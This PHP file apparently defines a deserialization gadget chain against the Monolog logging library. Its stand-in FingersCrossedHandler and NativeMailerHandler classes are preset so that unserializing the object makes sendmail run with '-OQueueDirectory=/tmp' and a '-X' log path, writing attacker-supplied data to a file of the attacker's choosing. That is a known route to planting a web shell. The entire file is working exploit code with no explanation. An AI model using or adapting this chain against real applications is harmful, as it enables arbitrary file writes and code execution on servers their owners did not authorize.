<?php

namespace Monolog\Handler
{
    class FingersCrossedHandler
    {
        protected $passthruLevel=0;
        protected $handler;
        protected $buffer;
        
        function __construct($path, $data)
        {
            $this->buffer = [["level"=>1]];
            $this->handler = new NativeMailerHandler($path, $data);
        }
    }

    class NativeMailerHandler
    {
        protected $level=0;
        protected $formatter;
        protected $contentType='text/plain';
        protected $parameters;
        protected $to=["a@b.c"];
        protected $subject;

        public function __construct($path, $data)
        {
            $this->subject = $data;
            $this->parameters = ['-OQueueDirectory=/tmp', '-X' . $path];
        }
    }
}

namespace Monolog\Formatter
{
    class NormalizerFormatter
    {
        public function __construct()
        {
        }
    }
}